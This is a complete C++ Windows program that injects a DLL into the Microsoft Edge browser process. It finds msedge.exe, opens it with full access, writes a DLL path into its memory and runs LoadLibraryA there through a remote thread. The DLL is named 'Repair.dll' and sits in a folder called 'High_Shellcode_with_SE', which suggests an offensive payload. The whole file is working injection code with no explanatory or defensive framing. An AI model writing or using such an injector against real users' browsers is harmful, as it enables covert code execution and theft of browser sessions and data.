#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

const char* dllPath = "D:/Programming/C++/High_Shellcode_with_SE/DLL/Repair.dll";
auto process = "msedge.exe";

// find process ID by process name
DWORD FindProcessId(const char *processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = 0;

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp(processName, entry.szExeFile) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
    DWORD pid = 0;

    pid = FindProcessId(process);

    if (pid == 0) {
        return 1;
    }

    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process) {
        return 1;
    }

    // Allocate memory in target process
    LPVOID remoteMemory = VirtualAllocEx(process, nullptr, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) {
        CloseHandle(process);
        return 1;
    }

    // Write DLL path to target process memory
    if (!WriteProcessMemory(process, remoteMemory, dllPath, strlen(dllPath) + 1, nullptr)) {
        VirtualFreeEx(process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    // Use LoadLibraryA (ANSI)
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) {
        VirtualFreeEx(process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    FARPROC loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
    if (!loadLibrary) {
        VirtualFreeEx(process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(process, nullptr, 0,
        (LPTHREAD_START_ROUTINE)loadLibrary, remoteMemory, 0, nullptr);
    if (!remoteThread) {
        VirtualFreeEx(process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(process);
        return 1;
    }

    DWORD moduleBase = 0;
    WaitForSingleObject(remoteThread, INFINITE);
    GetExitCodeThread(remoteThread, &moduleBase);

    // Optional cleanup
    CloseHandle(remoteThread);
    CloseHandle(process);
    return 0;
}